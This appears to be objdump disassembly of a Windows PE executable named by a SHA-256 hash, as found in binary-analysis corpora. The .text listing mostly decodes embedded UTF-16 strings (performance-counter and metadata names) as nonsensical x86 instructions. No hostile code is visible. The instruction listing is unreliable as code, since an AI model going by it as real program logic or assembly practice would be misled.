
6f32f8ac6b79b7686cf837194943a424ebf61f67e9fece3aacb2f7ea4f45d6aa.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	sub    BYTE PTR [esi+0x40],0x0
	...
  401010:	mov    al,0x6d
  401012:	inc    eax
  401013:	add    BYTE PTR [eax],al
  401015:	jno    0x401057
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax-0x4fffffcf],dh
  401021:	ins    DWORD PTR es:[edi],dx
  401022:	add    BYTE PTR [eax],al
  401024:	sub    BYTE PTR [esi+0x0],0x0
  401028:	xor    BYTE PTR [eax+0x0],0x0
  40102c:	nop
  40102d:	jo     0x40102f
  40102f:	add    BYTE PTR [eax+0x70],dh
  401035:	jno    0x401037
  401037:	add    al,ah
  401039:	jno    0x40103b
  40103b:	add    BYTE PTR [eax+0x74],dh
  40103e:	add    BYTE PTR [eax],al
  401040:	mov    al,ds:0x74
	...
  40104d:	add    BYTE PTR [eax],al
  40104f:	add    BYTE PTR [eax-0x2fffbf80],al
  401055:	add    BYTE PTR [eax+0x0],0x4e
  401059:	add    BYTE PTR [ebp+0x0],dl
  40105c:	dec    esp
  40105d:	add    BYTE PTR [eax+eax*1+0x0],cl
  401061:	add    BYTE PTR [eax],al
  401063:	add    BYTE PTR [eax],al
  401065:	add    BYTE PTR [eax],al
  401067:	add    BYTE PTR [ebx+0x0],bh
  40106a:	and    eax,0x38003000
  40106f:	add    BYTE PTR [eax+0x0],bh
  401072:	sub    eax,0x30002500
  401077:	add    BYTE PTR [eax+eax*1],dh
  40107a:	js     0x40107c
  40107c:	sub    eax,0x30002500
  401081:	add    BYTE PTR [eax+eax*1],dh
  401084:	js     0x401086
  401086:	sub    eax,0x30002500
  40108b:	add    BYTE PTR [edx],dh
  40108d:	add    BYTE PTR [eax+0x0],bh
  401090:	and    eax,0x32003000
  401095:	add    BYTE PTR [eax+0x0],bh
  401098:	sub    eax,0x30002500
  40109d:	add    BYTE PTR [edx],dh
  40109f:	add    BYTE PTR [eax+0x0],bh
  4010a2:	and    eax,0x32003000
  4010a7:	add    BYTE PTR [eax+0x0],bh
  4010aa:	and    eax,0x32003000
  4010af:	add    BYTE PTR [eax+0x0],bh
  4010b2:	and    eax,0x32003000
  4010b7:	add    BYTE PTR [eax+0x0],bh
  4010ba:	and    eax,0x32003000
  4010bf:	add    BYTE PTR [eax+0x0],bh
  4010c2:	and    eax,0x32003000
  4010c7:	add    BYTE PTR [eax+0x0],bh
  4010ca:	jge    0x4010cc
  4010cc:	add    BYTE PTR [eax],al
  4010ce:	add    BYTE PTR [eax],al
  4010d0:	cs dec edi
  4010d2:	inc    ebx
  4010d3:	push   eax
  4010d4:	add    BYTE PTR [eax],al
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	jmp    0x44910e0
	...
  4010e5:	add    BYTE PTR [eax],al
  4010e7:	add    BYTE PTR [eax],0x0
  4010ea:	add    BYTE PTR [eax],al
  4010ec:	add    BYTE PTR [eax],al
  4010ee:	add    BYTE PTR [eax+0x0],al
  4010f4:	add    BYTE PTR [eax],al
  4010f6:	add    BYTE PTR [eax+0x0],al
  4010fc:	add    BYTE PTR [eax],al
  4010fe:	add    BYTE PTR [eax+0x122ee297],al
  401104:	inc    edi
  401105:	mov    ebx,0x65b241ae
  40110a:	sbb    al,0xa8
  40110c:	ror    DWORD PTR [eax+0x304406d],1
  401112:	add    al,BYTE PTR [eax]
  401114:	popa   
  401115:	add    BYTE PTR [ebx+0x0],dh
  401118:	jae    0x40111a
  40111a:	add    BYTE PTR gs:[ebp+0x0],ch
  40111e:	bound  eax,QWORD PTR [eax]
  401120:	ins    BYTE PTR es:[edi],dx
  401121:	add    BYTE PTR [ecx+0x0],bh
  401124:	add    BYTE PTR [eax],al
  401126:	add    BYTE PTR [eax],al
  401128:	imul   eax,DWORD PTR [eax],0x73006e
  40112e:	je     0x401130
  401130:	jb     0x401132
  401132:	jne    0x401134
  401134:	ins    DWORD PTR es:[edi],dx
  401135:	add    BYTE PTR [ebp+0x0],ah
  401138:	outs   dx,BYTE PTR ds:[esi]
  401139:	add    BYTE PTR [eax+eax*1+0x61],dh
  40113d:	add    BYTE PTR [eax+eax*1+0x69],dh
  401141:	add    BYTE PTR [edi+0x0],ch
  401144:	outs   dx,BYTE PTR ds:[esi]
  401145:	add    BYTE PTR [ebp+0x0],cl
  401148:	popa   
  401149:	add    BYTE PTR [esi+0x0],ch
  40114c:	imul   eax,DWORD PTR [eax],0x650066
  401152:	jae    0x401154
  401154:	je     0x401156
  401156:	add    BYTE PTR [eax],al
  401158:	imul   eax,DWORD PTR [eax],0x73006e
  40115e:	je     0x401160
  401160:	jb     0x401162
  401162:	jne    0x401164
  401164:	ins    DWORD PTR es:[edi],dx
  401165:	add    BYTE PTR [ebp+0x0],ah
  401168:	outs   dx,BYTE PTR ds:[esi]
  401169:	add    BYTE PTR [eax+eax*1+0x61],dh
  40116d:	add    BYTE PTR [eax+eax*1+0x69],dh
  401171:	add    BYTE PTR [edi+0x0],ch
  401174:	outs   dx,BYTE PTR ds:[esi]
  401175:	add    BYTE PTR [eax],al
  401177:	add    BYTE PTR [ebx+0x0],ah
  40117a:	outs   dx,DWORD PTR ds:[esi]
  40117b:	add    BYTE PTR [ebp+0x0],dh
  40117e:	outs   dx,BYTE PTR ds:[esi]
  40117f:	add    BYTE PTR [eax+eax*1+0x65],dh
  401183:	add    BYTE PTR [edx+0x0],dh
  401186:	jae    0x401188
  401188:	add    BYTE PTR [eax],al
  40118a:	add    BYTE PTR [eax],al
  40118c:	jo     0x40118e
  40118e:	jb     0x401190
  401190:	outs   dx,DWORD PTR ds:[esi]
  401191:	add    BYTE PTR [esi+0x0],dh
  401194:	imul   eax,DWORD PTR [eax],0x650064
  40119a:	jb     0x40119c
  40119c:	add    BYTE PTR [eax],al
  40119e:	add    BYTE PTR [eax],al
  4011a0:	arpl   WORD PTR [eax],ax
  4011a2:	outs   dx,DWORD PTR ds:[esi]
  4011a3:	add    BYTE PTR [ebp+0x0],dh
  4011a6:	outs   dx,BYTE PTR ds:[esi]
  4011a7:	add    BYTE PTR [eax+eax*1+0x65],dh
  4011ab:	add    BYTE PTR [edx+0x0],dh
  4011ae:	push   ebx
  4011af:	add    BYTE PTR [ebp+0x0],ah
  4011b2:	je     0x4011b4
  4011b4:	add    BYTE PTR [eax],al
  4011b6:	add    BYTE PTR [eax],al
  4011b8:	arpl   WORD PTR [eax],ax
  4011ba:	outs   dx,DWORD PTR ds:[esi]
  4011bb:	add    BYTE PTR [ebp+0x0],dh
  4011be:	outs   dx,BYTE PTR ds:[esi]
  4011bf:	add    BYTE PTR [eax+eax*1+0x65],dh
  4011c3:	add    BYTE PTR [edx+0x0],dh
  4011c6:	add    BYTE PTR [eax],al
  4011c8:	arpl   WORD PTR [eax],ax
  4011ca:	outs   dx,DWORD PTR ds:[esi]
  4011cb:	add    BYTE PTR [ebp+0x0],dh
  4011ce:	outs   dx,BYTE PTR ds:[esi]
  4011cf:	add    BYTE PTR [eax+eax*1+0x65],dh
  4011d3:	add    BYTE PTR [edx+0x0],dh
  4011d6:	inc    ecx
  4011d7:	add    BYTE PTR [eax+eax*1+0x74],dh
  4011db:	add    BYTE PTR [edx+0x0],dh
  4011de:	imul   eax,DWORD PTR [eax],0x750062
  4011e4:	je     0x4011e6
  4011e6:	add    BYTE PTR gs:[ebx+0x0],dh
  4011ea:	add    BYTE PTR [eax],al
  4011ec:	arpl   WORD PTR [eax],ax
  4011ee:	outs   dx,DWORD PTR ds:[esi]
  4011ef:	add    BYTE PTR [ebp+0x0],dh
  4011f2:	outs   dx,BYTE PTR ds:[esi]
  4011f3:	add    BYTE PTR [eax+eax*1+0x65],dh
  4011f7:	add    BYTE PTR [edx+0x0],dh
  4011fa:	inc    ecx
  4011fb:	add    BYTE PTR [eax+eax*1+0x74],dh
  4011ff:	add    BYTE PTR [edx+0x0],dh
  401202:	imul   eax,DWORD PTR [eax],0x750062
  401208:	je     0x40120a
  40120a:	add    BYTE PTR gs:[eax],al
  40120d:	add    BYTE PTR [eax],al
  40120f:	add    BYTE PTR [eax+eax*1+0x6f],ch
  401213:	add    BYTE PTR [ebx+0x0],ah
  401216:	popa   
  401217:	add    BYTE PTR [eax+eax*1+0x69],ch
  40121b:	add    BYTE PTR [edx+0x0],bh
  40121e:	popa   
  40121f:	add    BYTE PTR [eax+eax*1+0x69],dh
  401223:	add    BYTE PTR [edi+0x0],ch
  401226:	outs   dx,BYTE PTR ds:[esi]
  401227:	add    BYTE PTR [eax],al
  401229:	add    BYTE PTR [eax],al
  40122b:	add    BYTE PTR [edx+0x0],dh
  40122e:	add    BYTE PTR gs:[ebx+0x0],dh
  401232:	outs   dx,DWORD PTR ds:[esi]
  401233:	add    BYTE PTR [ebp+0x0],dh
  401236:	jb     0x401238
  401238:	arpl   WORD PTR [eax],ax
  40123a:	add    BYTE PTR gs:[ebx+0x0],dh
  40123e:	add    BYTE PTR [eax],al
  401240:	jae    0x401242
  401242:	je     0x401244
  401244:	jb     0x401246
  401246:	imul   eax,DWORD PTR [eax],0x67006e
  40124c:	push   esp
  40124d:	add    BYTE PTR [ecx+0x0],ah
  401250:	bound  eax,QWORD PTR [eax]
  401252:	ins    BYTE PTR es:[edi],dx
  401253:	add    BYTE PTR [ebp+0x0],ah
  401256:	add    BYTE PTR [eax],al
  401258:	jae    0x40125a
  40125a:	je     0x40125c
  40125c:	jb     0x40125e
  40125e:	imul   eax,DWORD PTR [eax],0x67006e
  401264:	add    BYTE PTR [eax],al
  401266:	add    BYTE PTR [eax],al
  401268:	jae    0x40126a
  40126a:	arpl   WORD PTR [eax],ax
  40126c:	push   0x6d006500
  401271:	add    BYTE PTR [ecx+0x0],ah
  401274:	push   esi
  401275:	add    BYTE PTR [ebp+0x0],ah
  401278:	jb     0x40127a
  40127a:	jae    0x40127c
  40127c:	imul   eax,DWORD PTR [eax],0x6e006f
  401282:	add    BYTE PTR [eax],al
  401284:	jo     0x401286
  401286:	jb     0x401288
  401288:	outs   dx,DWORD PTR ds:[esi]
  401289:	add    BYTE PTR [esi+0x0],dh
  40128c:	imul   eax,DWORD PTR [eax],0x650064
  401292:	jb     0x401294
  401294:	inc    edi
  401295:	add    BYTE PTR [ebp+0x0],dh
  401298:	imul   eax,DWORD PTR [eax],0x64
  40129e:	add    BYTE PTR [eax],al
  4012a0:	jo     0x4012a2
  4012a2:	jb     0x4012a4
  4012a4:	outs   dx,DWORD PTR ds:[esi]
  4012a5:	add    BYTE PTR [esi+0x0],dh
  4012a8:	imul   eax,DWORD PTR [eax],0x650064
  4012ae:	jb     0x4012b0
  4012b0:	push   esp
  4012b1:	add    BYTE PTR [ecx+0x0],bh
  4012b4:	jo     0x4012b6
  4012b6:	add    BYTE PTR gs:[eax],al
  4012b9:	add    BYTE PTR [eax],al
  4012bb:	add    BYTE PTR [eax+0x0],dh
  4012be:	jb     0x4012c0
  4012c0:	outs   dx,DWORD PTR ds:[esi]
  4012c1:	add    BYTE PTR [esi+0x0],dh
  4012c4:	imul   eax,DWORD PTR [eax],0x650064
  4012ca:	jb     0x4012cc
  4012cc:	dec    esi
  4012cd:	add    BYTE PTR [ecx+0x0],ah
  4012d0:	ins    DWORD PTR es:[edi],dx
  4012d1:	add    BYTE PTR [ebp+0x0],ah
  4012d4:	add    BYTE PTR [eax],al
  4012d6:	add    BYTE PTR [eax],al
  4012d8:	jb     0x4012da
  4012da:	add    BYTE PTR gs:[ebx+0x0],dh
  4012de:	outs   dx,DWORD PTR ds:[esi]
  4012df:	add    BYTE PTR [ebp+0x0],dh
  4012e2:	jb     0x4012e4
  4012e4:	arpl   WORD PTR [eax],ax
  4012e6:	add    BYTE PTR gs:[edx+0x0],al
  4012ea:	popa   
  4012eb:	add    BYTE PTR [ebx+0x0],dh
  4012ee:	add    BYTE PTR gs:[eax],al
  4012f1:	add    BYTE PTR [eax],al
  4012f3:	add    BYTE PTR [ecx+0x0],ah
  4012f6:	jo     0x4012f8
  4012f8:	jo     0x4012fa
  4012fa:	ins    BYTE PTR es:[edi],dx
  4012fb:	add    BYTE PTR [ecx+0x0],ch
  4012fe:	arpl   WORD PTR [eax],ax
  401300:	popa   
  401301:	add    BYTE PTR [eax+eax*1+0x69],dh
  401305:	add    BYTE PTR [edi+0x0],ch
  401308:	outs   dx,BYTE PTR ds:[esi]
  401309:	add    BYTE PTR [ecx+0x0],cl
  40130c:	add    BYTE PTR fs:[ebp+0x0],ah
  401310:	outs   dx,BYTE PTR ds:[esi]
  401311:	add    BYTE PTR [eax+eax*1+0x69],dh
  401315:	add    BYTE PTR [eax+eax*1+0x79],dh
  401319:	add    BYTE PTR [eax],al
  40131b:	add    BYTE PTR [ebx+0x0],ah
  40131e:	popa   
  40131f:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401323:	add    BYTE PTR [edx+0x0],ah
  401326:	popa   
  401327:	add    BYTE PTR [ebx+0x0],ah
  40132a:	imul   eax,DWORD PTR [eax],0x0
  40132d:	add    BYTE PTR [eax],al
  40132f:	add    BYTE PTR [edi+0x0],ah
  401332:	jne    0x401334
  401334:	imul   eax,DWORD PTR [eax],0x64
  40133a:	add    BYTE PTR [eax],al
  40133c:	jne    0x40133e
  40133e:	jb     0x401340
  401340:	imul   eax,DWORD PTR [eax],0x6e0000
  401346:	popa   
  401347:	add    BYTE PTR [ebp+0x0],ch
  40134a:	add    BYTE PTR gs:[eax],al
  40134d:	add    BYTE PTR [eax],al
  40134f:	add    BYTE PTR [esi+0x0],ch
  401352:	popa   
  401353:	add    BYTE PTR [ebp+0x0],ch
  401356:	add    BYTE PTR gs:[ecx+0x0],cl
  40135a:	inc    esp
  40135b:	add    BYTE PTR [eax],al
  40135d:	add    BYTE PTR [eax],al
  40135f:	add    BYTE PTR [eax+eax*1+0x65],ah
  401363:	add    BYTE PTR [ebx+0x0],dh
  401366:	arpl   WORD PTR [eax],ax
  401368:	jb     0x40136a
  40136a:	imul   eax,DWORD PTR [eax],0x740070
  401370:	imul   eax,DWORD PTR [eax],0x6e006f
  401376:	add    BYTE PTR [eax],al
  401378:	add    BYTE PTR fs:[ebp+0x0],ah
  40137c:	jae    0x40137e
  40137e:	arpl   WORD PTR [eax],ax
  401380:	jb     0x401382
  401382:	imul   eax,DWORD PTR [eax],0x740070
  401388:	imul   eax,DWORD PTR [eax],0x6e006f
  40138e:	dec    ecx
  40138f:	add    BYTE PTR [eax+eax*1+0x0],al
  401393:	add    BYTE PTR [ecx+0x0],ch
  401396:	outs   dx,BYTE PTR ds:[esi]
  401397:	add    BYTE PTR [ebx+0x0],dh
  40139a:	je     0x40139c
  40139c:	popa   
  40139d:	add    BYTE PTR [esi+0x0],ch
  4013a0:	arpl   WORD PTR [eax],ax
  4013a2:	add    BYTE PTR gs:[ebx+0x0],dh
  4013a6:	add    BYTE PTR [eax],al
  4013a8:	imul   eax,DWORD PTR [eax],0x64
  4013ae:	add    BYTE PTR [eax],al
  4013b0:	je     0x4013b2
  4013b2:	jns    0x4013b4
  4013b4:	jo     0x4013b6
  4013b6:	add    BYTE PTR gs:[eax],al
  4013b9:	add    BYTE PTR [eax],al
  4013bb:	add    BYTE PTR [edx+0x0],ah
  4013be:	popa   
  4013bf:	add    BYTE PTR [ebx+0x0],dh
  4013c2:	add    BYTE PTR gs:[ecx+0x0],cl
  4013c6:	inc    esp
  4013c7:	add    BYTE PTR [eax],al
  4013c9:	add    BYTE PTR [eax],al
  4013cb:	add    BYTE PTR [eax+eax*1+0x65],ah
  4013cf:	add    BYTE PTR [esi+0x0],ah
  4013d2:	popa   
  4013d3:	add    BYTE PTR [ebp+0x0],dh
  4013d6:	ins    BYTE PTR es:[edi],dx
  4013d7:	add    BYTE PTR [eax+eax*1+0x53],dh
  4013db:	add    BYTE PTR [ebx+0x0],ah
  4013de:	popa   
  4013df:	add    BYTE PTR [eax+eax*1+0x65],ch
  4013e3:	add    BYTE PTR [eax],al
  4013e5:	add    BYTE PTR [eax],al
  4013e7:	add    BYTE PTR [eax+eax*1+0x65],ah
  4013eb:	add    BYTE PTR [eax+eax*1+0x61],dh
  4013ef:	add    BYTE PTR [ecx+0x0],ch
  4013f2:	ins    BYTE PTR es:[edi],dx
  4013f3:	add    BYTE PTR [eax+eax*1+0x65],cl
  4013f7:	add    BYTE PTR [esi+0x0],dh
  4013fa:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  4013ff:	add    BYTE PTR [ecx+0x0],ah
  401402:	add    BYTE PTR [bx+0x0],ah
  401406:	jb     0x401408
  401408:	add    BYTE PTR gs:[edi+0x0],ah
  40140c:	popa   
  40140d:	add    BYTE PTR [eax+eax*1+0x65],dh
  401411:	add    BYTE PTR [eax],al
  401413:	add    BYTE PTR [eax+0x0],dh
  401416:	add    BYTE PTR gs:[edx+0x0],dh
  40141a:	data16 add BYTE PTR [eax+eax*1+0x69],dl
  40141f:	add    BYTE PTR [ebp+0x0],ch
  401422:	add    BYTE PTR gs:[ecx+0x0],cl
  401426:	inc    esp
  401427:	add    BYTE PTR [eax],al
  401429:	add    BYTE PTR [eax],al
  40142b:	add    BYTE PTR [eax+0x0],dh
  40142e:	add    BYTE PTR gs:[edx+0x0],dh
  401432:	data16 add BYTE PTR [esi+0x0],al
  401436:	jb     0x401438
  401438:	add    BYTE PTR gs:[ecx+0x0],dh
  40143c:	dec    ecx
  40143d:	add    BYTE PTR [eax+eax*1+0x0],al
  401441:	add    BYTE PTR [eax],al
  401443:	add    BYTE PTR [ebp+0x0],ch
  401446:	jne    0x401448
  401448:	ins    BYTE PTR es:[edi],dx
  401449:	add    BYTE PTR [eax+eax*1+0x69],dh
  40144d:	add    BYTE PTR [ebx+0x0],al
  401450:	outs   dx,DWORD PTR ds:[esi]
  401451:	add    BYTE PTR [ebp+0x0],dh
  401454:	outs   dx,BYTE PTR ds:[esi]
  401455:	add    BYTE PTR [eax+eax*1+0x65],dh
  401459:	add    BYTE PTR [edx+0x0],dh
  40145c:	dec    ecx
  40145d:	add    BYTE PTR [eax+eax*1+0x0],al
  401461:	add    BYTE PTR [eax],al
  401463:	add    BYTE PTR [ebx+0x0],ah
  401466:	jne    0x401468
  401468:	ins    BYTE PTR es:[edi],dx
  401469:	add    BYTE PTR [eax+eax*1+0x75],dh
  40146d:	add    BYTE PTR [edx+0x0],dh
  401470:	add    BYTE PTR gs:[eax],al
  401473:	add    BYTE PTR [esi+0x0],dh
  401476:	popa   
  401477:	add    BYTE PTR [eax+eax*1+0x75],ch
  40147b:	add    BYTE PTR [ebp+0x0],ah
  40147e:	add    BYTE PTR [eax],al
  401480:	push   ebx
  401481:	add    BYTE PTR [eax+eax*1+0x72],dh
  401485:	add    BYTE PTR [ebp+0x0],dh
  401488:	arpl   WORD PTR [eax],ax
  40148a:	je     0x40148c
  40148c:	jae    0x40148e
  40148e:	add    BYTE PTR [eax],al
  401490:	push   ebx
  401491:	add    BYTE PTR [eax+eax*1+0x72],dh
  401495:	add    BYTE PTR [ebp+0x0],dh
  401498:	arpl   WORD PTR [eax],ax
  40149a:	je     0x40149c
  40149c:	add    BYTE PTR [eax],al
  40149e:	add    BYTE PTR [eax],al
  4014a0:	inc    esi
  4014a1:	add    BYTE PTR [ecx+0x0],ch
  4014a4:	add    BYTE PTR gs:[eax+eax*1+0x64],ch
  4014a9:	add    BYTE PTR [eax],al
  4014ab:	add    BYTE PTR [ebx+0x0],dl
  4014ae:	jns    0x4014b0
  4014b0:	ins    DWORD PTR es:[edi],dx
  4014b1:	add    BYTE PTR [edx+0x0],ah
  4014b4:	outs   dx,DWORD PTR ds:[esi]
  4014b5:	add    BYTE PTR [eax+eax*1+0x0],ch
  4014b9:	add    BYTE PTR [eax],al
  4014bb:	add    BYTE PTR [ebx+0x0],dl
  4014be:	add    BYTE PTR gs:[ebx+0x0],ah
  4014c2:	jne    0x4014c4
  4014c4:	jb     0x4014c6
  4014c6:	imul   eax,DWORD PTR [eax],0x790074
  4014cc:	inc    esp
  4014cd:	add    BYTE PTR [ebp+0x0],ah
  4014d0:	jae    0x4014d2
  4014d2:	arpl   WORD PTR [eax],ax
  4014d4:	jb     0x4014d6
  4014d6:	imul   eax,DWORD PTR [eax],0x740070
  4014dc:	outs   dx,DWORD PTR ds:[esi]
  4014dd:	add    BYTE PTR [edx+0x0],dh
  4014e0:	add    BYTE PTR [eax],al
  4014e2:	add    BYTE PTR [eax],al
  4014e4:	jne    0x4014e6
  4014e6:	jae    0x4014e8
  4014e8:	add    BYTE PTR gs:[edx+0x0],dh
  4014ec:	dec    ebp
  4014ed:	add    BYTE PTR [edi+0x0],ch
  4014f0:	add    BYTE PTR fs:[ebp+0x0],ah
  4014f4:	add    BYTE PTR [eax],al
  4014f6:	add    BYTE PTR [eax],al
  4014f8:	push   eax
  4014f9:	add    BYTE PTR [ebp+0x0],al
  4014fc:	push   edx
  4014fd:	add    BYTE PTR [esi+0x0],al
  401500:	pop    edi
  401501:	add    BYTE PTR [eax+0x0],dl
  401504:	push   edx
  401505:	add    BYTE PTR [edi+0x0],cl
  401508:	push   esi
  401509:	add    BYTE PTR [ecx+0x0],cl
  40150c:	inc    esp
  40150d:	add    BYTE PTR [ebp+0x0],al
  401510:	push   edx
  401511:	add    BYTE PTR [edi+0x0],bl
  401514:	push   ebp
  401515:	add    BYTE PTR [ebx+0x0],dl
  401518:	inc    ebp
  401519:	add    BYTE PTR [edx+0x0],dl
  40151c:	pop    edi
  40151d:	add    BYTE PTR [ebp+0x0],cl
  401520:	dec    edi
  401521:	add    BYTE PTR [eax+eax*1+0x45],al
  401525:	add    BYTE PTR [eax],al
  401527:	add    BYTE PTR [ebx+0x0],ch
  40152a:	add    BYTE PTR gs:[edx+0x0],dh
  40152e:	outs   dx,BYTE PTR ds:[esi]
  40152f:	add    BYTE PTR [ebp+0x0],ah
  401532:	ins    BYTE PTR es:[edi],dx
  401533:	add    BYTE PTR [ebp+0x0],cl
  401536:	outs   dx,DWORD PTR ds:[esi]
  401537:	add    BYTE PTR [eax+eax*1+0x65],ah
  40153b:	add    BYTE PTR [eax],al
  40153d:	add    BYTE PTR [eax],al
  40153f:	add    BYTE PTR [eax+0x0],dl
  401542:	inc    ebp
  401543:	add    BYTE PTR [edx+0x0],dl
  401546:	inc    esi
  401547:	add    BYTE PTR [edi+0x0],bl
  40154a:	push   eax
  40154b:	add    BYTE PTR [edx+0x0],dl
  40154e:	dec    edi
  40154f:	add    BYTE PTR [esi+0x0],dl
  401552:	dec    ecx
  401553:	add    BYTE PTR [eax+eax*1+0x45],al
  401557:	add    BYTE PTR [edx+0x0],dl
  40155a:	pop    edi
  40155b:	add    BYTE PTR [ebx+0x0],cl
  40155e:	inc    ebp
  40155f:	add    BYTE PTR [edx+0x0],dl
  401562:	dec    esi
  401563:	add    BYTE PTR [ebp+0x0],al
  401566:	dec    esp
  401567:	add    BYTE PTR [edi+0x0],bl
  40156a:	dec    ebp
  40156b:	add    BYTE PTR [edi+0x0],cl
  40156e:	inc    esp
  40156f:	add    BYTE PTR [ebp+0x0],al
  401572:	add    BYTE PTR [eax],al
  401574:	add    BYTE PTR fs:[edx+0x0],dh
  401578:	imul   eax,DWORD PTR [eax],0x650076
  40157e:	jb     0x401580
  401580:	add    BYTE PTR [eax],al
  401582:	add    BYTE PTR [eax],al
  401584:	push   eax
  401585:	add    BYTE PTR [ebp+0x0],al
  401588:	push   edx
  401589:	add    BYTE PTR [esi+0x0],al
  40158c:	pop    edi
  40158d:	add    BYTE PTR [eax+0x0],dl
  401590:	push   edx
  401591:	add    BYTE PTR [edi+0x0],cl
  401594:	push   esi
  401595:	add    BYTE PTR [ecx+0x0],cl
  401598:	inc    esp
  401599:	add    BYTE PTR [ebp+0x0],al
  40159c:	push   edx
  40159d:	add    BYTE PTR [edi+0x0],bl
  4015a0:	inc    esp
  4015a1:	add    BYTE PTR [edx+0x0],dl
  4015a4:	dec    ecx
  4015a5:	add    BYTE PTR [esi+0x0],dl
  4015a8:	inc    ebp
  4015a9:	add    BYTE PTR [edx+0x0],dl
  4015ac:	add    BYTE PTR [eax],al
  4015ae:	add    BYTE PTR [eax],al
  4015b0:	add    BYTE PTR fs:[ebp+0x0],ah
  4015b4:	data16 add BYTE PTR [ecx+0x0],ah
  4015b8:	jne    0x4015ba
  4015ba:	ins    BYTE PTR es:[edi],dx
  4015bb:	add    BYTE PTR [eax+eax*1+0x0],dh
  4015bf:	add    BYTE PTR [eax],dh
  4015c1:	add    BYTE PTR [eax],al
  4015c3:	add    BYTE PTR [ebx+0x0],ah
  4015c6:	jne    0x4015c8
  4015c8:	jae    0x4015ca
  4015ca:	je     0x4015cc
  4015cc:	outs   dx,DWORD PTR ds:[esi]
  4015cd:	add    BYTE PTR [ebp+0x0],ch
  4015d0:	add    BYTE PTR [eax],al
  4015d2:	add    BYTE PTR [eax],al
  4015d4:	xor    DWORD PTR [eax],eax
  4015d6:	add    BYTE PTR [eax],al
  4015d8:	jae    0x4015da
  4015da:	imul   eax,DWORD PTR [eax],0x67006e
  4015e0:	ins    BYTE PTR es:[edi],dx
  4015e1:	add    BYTE PTR [ebp+0x0],ah
  4015e4:	add    BYTE PTR [eax],al
  4015e6:	add    BYTE PTR [eax],al
  4015e8:	push   eax
  4015e9:	add    BYTE PTR [ebp+0x0],al
  4015ec:	push   edx
  4015ed:	add    BYTE PTR [esi+0x0],al
  4015f0:	pop    edi
  4015f1:	add    BYTE PTR [ebx+0x0],al
  4015f4:	dec    edi
  4015f5:	add    BYTE PTR [ebp+0x0],dl
  4015f8:	dec    esi
  4015f9:	add    BYTE PTR [eax+eax*1+0x45],dl
  4015fd:	add    BYTE PTR [edx+0x0],dl
  401600:	push   ebx
  401601:	add    BYTE PTR [ebp+0x0],al
  401604:	push   esp
  401605:	add    BYTE PTR [edi+0x0],bl
  401608:	push   ebx
  401609:	add    BYTE PTR [ecx+0x0],cl
  40160c:	dec    esi
  40160d:	add    BYTE PTR [edi+0x0],al
  401610:	dec    esp
  401611:	add    BYTE PTR [ebp+0x0],al
  401614:	pop    edi
  401615:	add    BYTE PTR [ecx+0x0],cl
  401618:	dec    esi
  401619:	add    BYTE PTR [ebx+0x0],dl
  40161c:	push   esp
  40161d:	add    BYTE PTR [ecx+0x0],al
  401620:	dec    esi
  401621:	add    BYTE PTR [ebx+0x0],al
  401624:	inc    ebp
  401625:	add    BYTE PTR [eax],al
  401627:	add    BYTE PTR [ebp+0x0],ch
  40162a:	jne    0x40162c
  40162c:	ins    BYTE PTR es:[edi],dx
  40162d:	add    BYTE PTR [eax+eax*1+0x69],dh
  401631:	add    BYTE PTR [eax+0x0],dh
  401634:	ins    BYTE PTR es:[edi],dx
  401635:	add    BYTE PTR [ebp+0x0],ah
	...
  401640:	push   eax
  401641:	add    BYTE PTR [ebp+0x0],al
  401644:	push   edx
  401645:	add    BYTE PTR [esi+0x0],al
  401648:	pop    edi
  401649:	add    BYTE PTR [ebx+0x0],al
  40164c:	dec    edi
  40164d:	add    BYTE PTR [ebp+0x0],dl
  401650:	dec    esi
  401651:	add    BYTE PTR [eax+eax*1+0x45],dl
  401655:	add    BYTE PTR [edx+0x0],dl
  401658:	push   ebx
  401659:	add    BYTE PTR [ebp+0x0],al
  40165c:	push   esp
  40165d:	add    BYTE PTR [edi+0x0],bl
  401660:	dec    ebp
  401661:	add    BYTE PTR [ebp+0x0],dl
  401664:	dec    esp
  401665:	add    BYTE PTR [eax+eax*1+0x49],dl
  401669:	add    BYTE PTR [edi+0x0],bl
  40166c:	dec    ecx
  40166d:	add    BYTE PTR [esi+0x0],cl
  401670:	push   ebx
  401671:	add    BYTE PTR [eax+eax*1+0x41],dl
  401675:	add    BYTE PTR [esi+0x0],cl
  401678:	inc    ebx
  401679:	add    BYTE PTR [ebp+0x0],al
  40167c:	push   ebx
  40167d:	add    BYTE PTR [eax],al
  40167f:	add    BYTE PTR [edi+0x0],ah
  401682:	ins    BYTE PTR es:[edi],dx
  401683:	add    BYTE PTR [edi+0x0],ch
  401686:	bound  eax,QWORD PTR [eax]
  401688:	popa   
  401689:	add    BYTE PTR [eax+eax*1+0x41],ch
  40168d:	add    BYTE PTR [edi+0x0],ah
  401690:	add    BYTE PTR [bp+si+0x0],dh
  401694:	add    BYTE PTR gs:[edi+0x0],ah
  401698:	popa   
  401699:	add    BYTE PTR [eax+eax*1+0x65],dh
  40169d:	add    BYTE PTR [eax],al
  40169f:	add    BYTE PTR [eax+0x0],dl
  4016a2:	inc    ebp
  4016a3:	add    BYTE PTR [edx+0x0],dl
  4016a6:	inc    esi
  4016a7:	add    BYTE PTR [edi+0x0],bl
  4016aa:	inc    ebx
  4016ab:	add    BYTE PTR [edi+0x0],cl
  4016ae:	push   ebp
  4016af:	add    BYTE PTR [esi+0x0],cl
  4016b2:	push   esp
  4016b3:	add    BYTE PTR [ebp+0x0],al
  4016b6:	push   edx
  4016b7:	add    BYTE PTR [ebx+0x0],dl
  4016ba:	inc    ebp
  4016bb:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4016bf:	add    BYTE PTR [ebx+0x0],dl
  4016c2:	dec    ecx
  4016c3:	add    BYTE PTR [esi+0x0],cl
  4016c6:	inc    edi
  4016c7:	add    BYTE PTR [eax+eax*1+0x45],cl
  4016cb:	add    BYTE PTR [edi+0x0],bl
  4016ce:	inc    ecx
  4016cf:	add    BYTE PTR [edi+0x0],al
  4016d2:	inc    edi
  4016d3:	add    BYTE PTR [edx+0x0],dl
  4016d6:	inc    ebp
  4016d7:	add    BYTE PTR [edi+0x0],al
  4016da:	inc    ecx
